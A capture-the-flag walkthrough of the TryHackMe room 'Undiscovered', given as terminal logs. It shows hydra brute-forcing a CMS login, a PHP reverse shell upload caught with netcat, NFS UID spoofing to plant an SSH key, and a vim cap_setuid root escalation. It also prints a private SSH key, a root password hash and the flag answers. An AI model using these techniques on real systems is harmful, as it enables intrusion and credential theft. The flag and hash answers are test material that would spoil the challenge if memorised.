# Undiscovered

Discovery consists not in seeking new landscapes, but in having new eyes..

[Undiscovered](https://tryhackme.com/room/undiscoveredup)

## Topic's

- Network Enumeration
- Web Enumeration
- Brute Forcing (http-post-form)
- Exploitation Upload
- Exploitation NFS
- Exploitation User ID
- Abusing SUID/GUID
- Capabilities

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Capture The Flag

Please allow 5 minutes for this instance to fully deploy before attacking. This vm was developed in collaboration with @H0j3n, thanks to him for the foothold and privilege escalation ideas.

Please consider adding undiscovered.thm in /etc/hosts

```
kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo nmap -A -sS -sC -sV -O 10.10.59.152
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-30 10:54 CET
Nmap scan report for 10.10.59.152
Host is up (0.031s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)
|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)
|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
80/tcp   open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://undiscovered.thm
111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100021  1,3,4      35002/udp   nlockmgr
|   100021  1,3,4      36838/tcp   nlockmgr
|   100021  1,3,4      36993/tcp6  nlockmgr
|   100021  1,3,4      51734/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp open  nfs     2-4 (RPC #100003)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/30%OT=22%CT=1%CU=44466%PV=Y%DS=2%DC=T%G=Y%TM=5F9BE2
OS:D2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT      ADDRESS
1   29.83 ms 10.8.0.1
2   29.97 ms 10.10.59.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.71 seconds
```

```
kali@kali:~/CTFs/tryhackme/Undiscovered$ gobuster vhost -u http://undiscovered.thm/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:          http://undiscovered.thm/
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.0.1
[+] Timeout:      10s
===============================================================
2020/10/30 10:57:52 Starting gobuster
===============================================================
Found: manager.undiscovered.thm (Status: 200) [Size: 4584]
Found: dashboard.undiscovered.thm (Status: 200) [Size: 4626]
Found: deliver.undiscovered.thm (Status: 200) [Size: 4650]
Found: newsite.undiscovered.thm (Status: 200) [Size: 4584]
Found: develop.undiscovered.thm (Status: 200) [Size: 4584]
Found: forms.undiscovered.thm (Status: 200) [Size: 4542]
Found: maintenance.undiscovered.thm (Status: 200) [Size: 4668]
Found: network.undiscovered.thm (Status: 200) [Size: 4584]
Found: view.undiscovered.thm (Status: 200) [Size: 4521]
Found: mailgate.undiscovered.thm (Status: 200) [Size: 4605]
Found: play.undiscovered.thm (Status: 200) [Size: 4521]
Found: start.undiscovered.thm (Status: 200) [Size: 4542]
Found: booking.undiscovered.thm (Status: 200) [Size: 4599]
Found: terminal.undiscovered.thm (Status: 200) [Size: 4605]
Found: gold.undiscovered.thm (Status: 200) [Size: 4521]
Found: internet.undiscovered.thm (Status: 200) [Size: 4605]
Found: resources.undiscovered.thm (Status: 200) [Size: 4626]
```

`manager.undiscovered.thm dashboard.undiscovered.thm deliver.undiscovered.thm newsite.undiscovered.thm develop.undiscovered.thm forms.undiscovered.thm maintenance.undiscovered.thm network.undiscovered.thm view.undiscovered.thm mailgate.undiscovered.thm play.undiscovered.thm start.undiscovered.thm booking.undiscovered.thm terminal.undiscovered.thm gold.undiscovered.thm internet.undiscovered.thm resources.undiscovered.thm`

[http://deliver.undiscovered.thm/](http://deliver.undiscovered.thm/)

`Powered by RiteCMS Version:2.2.1`

```
kali@kali:~/CTFs/tryhackme/Undiscovered$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -f
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-30 11:13:22
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong
[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
[STATUS] attack finished for deliver.undiscovered.thm (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-30 11:13:29
```

`admin:liverpool`

![](./2020-10-30_11-14.png)

![](./2020-10-30_11-24.png)

[http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&action=upload&directory=files](http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&action=upload&directory=files)

[http://deliver.undiscovered.thm/files/php-reverse-shell.php](http://deliver.undiscovered.thm/files/php-reverse-shell.php)

```
kali@kali:~/CTFs/tryhackme/Undiscovered$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.141.31 60756
Linux undiscovered 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 23:10:38 up 1 min,  0 users,  load average: 0.20, 0.15, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@undiscovered:/$ ^Z
[1]+  Stopped                 nc -lvnp 9001
kali@kali:~/CTFs/tryhackme/Undiscovered$ stty raw -echo
kali@kali:~/CTFs/tryhackme/Undiscovered$ nc -lvnp 9001

www-data@undiscovered:/$ export TERM=xterm
www-data@undiscovered:/$
```

```
www-data@undiscovered:/$ cat /etc/exports
# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#

/home/william   *(rw,root_squash)
www-data@undiscovered:/$ cat /etc/passwd | grep william
william:x:3003:3003::/home/william:/bin/bash
www-data@undiscovered:/$
```

```
william:x:3003:3003::/home/william:/bin/bash
leonard:x:1002:1002::/home/leonard:/bin/bash
```

```
kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo useradd -u 3003 william
kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo useradd -u 1002 leonard

kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo passwd william
New password:
Retype new password:
passwd: password updated successfully

kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo passwd leonard
New password:
Retype new password:
passwd: password updated successfully

kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mkdir -p /mnt/undiscoverd/william
kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mkdir -p /mnt/undiscoverd/leonard
```

```
kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo usermod -aG sudo leonard
kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo usermod -aG sudo william
```

```
sudo mount -t nfs 10.10.141.31:/home/william /mnt/undiscoverd/william
```

```
kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mount -t nfs 10.10.141.31:/home/william /mnt/undiscoverd/william
[sudo] password for kali:
kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo su william
$ 123
sh: 1: 123: not found
$ /bin/bash
william@kali:/home/kali/CTFs/tryhackme/Undiscovered$ cd /mnt/undiscoverd/william
william@kali:/mnt/undiscoverd/william$ ls
admin.sh  script  user.txt
william@kali:/mnt/undiscoverd/william$ cat user.txt
THM{8d7b7299cccd1796a61915901d0e091c}
```

```
kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo su william
$ 123
sh: 1: 123: not found
$ /bin/bash
william@kali:/home/kali/CTFs/tryhackme/Undiscovered$ cd /mnt/undiscoverd/william
william@kali:/mnt/undiscoverd/william$ ls
admin.sh  script  user.txt
william@kali:/mnt/undiscoverd/william$ cat user.txt
THM{8d7b7299cccd1796a61915901d0e091c}
william@kali:/mnt/undiscoverd/william$ mkdir .ssh
william@kali:/mnt/undiscoverd/william$ cd .ssh/
william@kali:/mnt/undiscoverd/william/.ssh$ ssh-keygen -f william
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in william
Your public key has been saved in william.pub
The key fingerprint is:
SHA256:3kiWEQ/cM5Wy1fGlEPQ4G95msZ2pR7YX0P20ZMdfBJk william@kali
The key's randomart image is:
+---[RSA 3072]----+
|       .o. o=+o=o|
|        .+= o+E=o|
|        . .*+.++B|
|         o.. =+=O|
|        S   o =B+|
|       + o   o+ o|
|        o .  . o.|
|              . .|
|                 |
+----[SHA256]-----+
william@kali:/mnt/undiscoverd/william/.ssh$ ls
william  william.pub
william@kali:/mnt/undiscoverd/william/.ssh$ chmod 600 william
william@kali:/mnt/undiscoverd/william/.ssh$ mkdir authorized_keys
william@kali:/mnt/undiscoverd/william/.ssh$ rm authorized_keys/
rm: cannot remove 'authorized_keys/': Is a directory
william@kali:/mnt/undiscoverd/william/.ssh$ rm -rf authorized_keys/
william@kali:/mnt/undiscoverd/william/.ssh$ cat william.pub > .ssh/authorized_keys
bash: .ssh/authorized_keys: No such file or directory
william@kali:/mnt/undiscoverd/william/.ssh$ cat william.pub > authorized_keys
william@kali:/mnt/undiscoverd/william/.ssh$ ssh -i william william@10.10.18.161
^C
william@kali:/mnt/undiscoverd/william/.ssh$ ssh -i william william@10.10.141.31
Could not create directory '/home/william/.ssh'.
The authenticity of host '10.10.141.31 (10.10.141.31)' can't be established.
ECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Failed to add the host to the list of known hosts (/home/william/.ssh/known_hosts).
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Thu Sep 10 00:35:09 2020 from 192.168.0.147
william@undiscovered:~$ cat admin.sh
#!/bin/sh

    echo "[i] Start Admin Area!"
    echo "[i] Make sure to keep this script safe from anyone else!"

    exit 0
william@undiscovered:~$ ./script
[i] Start Admin Area!
[i] Make sure to keep this script safe from anyone else!
william@undiscovered:~$ ./script test
/bin/cat: /home/leonard/test: No such file or directory
william@undiscovered:~$ ./script .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ
HEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df
YU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn
SqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih
hT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL
+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN
C1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt
+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i
72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg
Jb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ
xnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI
Ktn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD
BUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm
L99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc
TIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2
ZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ
iTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg
zWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK
3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk
OGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8
jbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld
sjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+
cMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa
bFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs
LsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=
-----END RSA PRIVATE KEY-----
william@undiscovered:~$ ./script .ssh/id_rsa > leonard
william@undiscovered:~$ chmod 600 leonard
william@undiscovered:~$ ssh -i leonard leonard@undiscovered
The authenticity of host 'undiscovered (127.0.1.1)' can't be established.
ECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'undiscovered' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


0 packages can be updated.
0 updates are security updates.


Last login: Fri Sep  4 22:57:43 2020 from 192.168.68.129
leonard@undiscovered:~$ find / -type f -name "*vi*" -perm -4000 -ls 2>/dev/null
   390706     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
leonard@undiscovered:~$
```

```
leonard@undiscovered:~$ find / -type f -name "*vi*" -perm -4000 -ls 2>/dev/null
   390706     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
leonard@undiscovered:~$ getcap -r / 2>/dev/null
/usr/bin/mtr = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/vim.basic = cap_setuid+ep
leonard@undiscovered:~$ /usr/bin/vim.basic -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

```
# id
sh: 1: ot found
sh: 1: 2Rid: not found
# cat /etc/shadow | grep -i root
root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::
#
```

1. user.txt

`THM{8d7b7299cccd1796a61915901d0e091c}`

2. Whats the root user's password hash?

`root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::`
